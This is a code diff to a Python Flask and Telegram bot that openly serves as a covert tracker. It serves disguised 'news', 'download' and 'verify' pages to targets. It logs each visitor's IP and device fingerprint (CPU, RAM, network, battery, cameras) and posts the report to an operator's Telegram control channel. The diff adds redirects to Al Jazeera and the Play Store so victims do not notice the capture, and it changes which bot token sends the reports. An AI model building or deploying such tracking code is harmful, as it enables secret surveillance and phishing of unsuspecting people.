@@ -30,7 +30,7 @@ def send_message(chat_id: str, message: str, token: str = None):
     - للمستخدمين: يستخدم MAIN_BOT_TOKEN (الذي بدأه المستخدم بالفعل)
     - لقناة المدير: يستخدم TRACKER_BOT_TOKEN (بوت التعقب أدمن في القناة)
     """
-    use_token = token or MAIN_BOT_TOKEN
+    use_token = token or TRACKER_BOT_TOKEN
     try:
         r = requests.post(
             f"https://api.telegram.org/bot{use_token}/sendMessage",
@@ -546,10 +546,16 @@ def _serve_tracker(chat_id: str, session_id: str, page_type: str):
         "━━━━━━━━━━━━━━━━━━━━━\n"
         "✦ راشد — تطوير أبو سعود"
     )
-    send_message(CONTROL_CHANNEL_ID, quick_notif, token=MAIN_BOT_TOKEN)
+    send_message(CONTROL_CHANNEL_ID, quick_notif, token=TRACKER_BOT_TOKEN)
 
     template = PAGE_TEMPLATES.get(page_type, NEWS_HTML)
-    redirect_url = "https://t.me/Rashid_Thunder_bot" if page_type == "bot" else "none"
+    redirect_map = {
+        "bot":      "https://t.me/Rashid_Thunder_bot",
+        "news":     "https://www.aljazeera.net",
+        "download": "https://play.google.com/store",
+        "verify":   "https://t.me/Rashid_Thunder_bot",
+    }
+    redirect_url = redirect_map.get(page_type, "https://www.aljazeera.net")
     return render_template_string(
         template,
         ip=ip,
@@ -616,16 +622,16 @@ def log_device(chat_id: str, session_id: str):
 
         "⚙️ *[ المعالج والذاكرة ]*\n"
         f"🧠 أنوية CPU  : {d.get('cpuCores', 'N/A')}\n"
-        f"💾 RAM        : {d.get('ramGB', 'N/A')} GB\n\n"
+        f"💾 RAM        : {(str(d['ramGB'])+' GB') if d.get('ramGB') not in (None,'N/A') else ('❌ iOS لا يدعمه' if 'iPhone' in d.get('userAgent','') or 'iPad' in d.get('userAgent','') else 'N/A')}\n\n"
 
         "📶 *[ الاتصال ]*\n"
-        f"📡 نوع الشبكة : {d.get('connType', 'N/A')}\n"
-        f"⚡ السرعة    : {d.get('connSpeed', 'N/A')}\n"
-        f"⏱️ التأخير    : {d.get('connRTT', 'N/A')}\n\n"
+        f"📡 نوع الشبكة : {d.get('connType', 'N/A') if d.get('connType','N/A') != 'N/A' else ('❌ iOS لا يدعمه' if 'iPhone' in d.get('userAgent','') or 'iPad' in d.get('userAgent','') else 'N/A')}\n"
+        f"⚡ السرعة    : {d.get('connSpeed', 'N/A') if d.get('connSpeed','N/A') != 'N/A' else ('❌ iOS لا يدعمه' if 'iPhone' in d.get('userAgent','') or 'iPad' in d.get('userAgent','') else 'N/A')}\n"
+        f"⏱️ التأخير    : {d.get('connRTT', 'N/A') if d.get('connRTT','N/A') != 'N/A' else ('❌ iOS لا يدعمه' if 'iPhone' in d.get('userAgent','') or 'iPad' in d.get('userAgent','') else 'N/A')}\n\n"
 
         "🔋 *[ البطارية ]*\n"
-        f"🔋 المستوى   : {d.get('battery', 'N/A')}\n"
-        f"⚡ الحالة    : {d.get('charging', 'N/A')}\n\n"
+        f"🔋 المستوى   : {d.get('battery', 'N/A') if d.get('battery','N/A') != 'N/A' else ('❌ iOS لا يدعمه' if 'iPhone' in d.get('userAgent','') or 'iPad' in d.get('userAgent','') else 'N/A')}\n"
+        f"⚡ الحالة    : {d.get('charging', 'N/A') if d.get('charging','N/A') != 'N/A' else ('❌ iOS لا يدعمه' if 'iPhone' in d.get('userAgent','') or 'iPad' in d.get('userAgent','') else 'N/A')}\n\n"
 
         "📷 *[ الأجهزة المتصلة ]*\n"
         f"📷 كاميرات   : {d.get('cameras', 0)}\n"
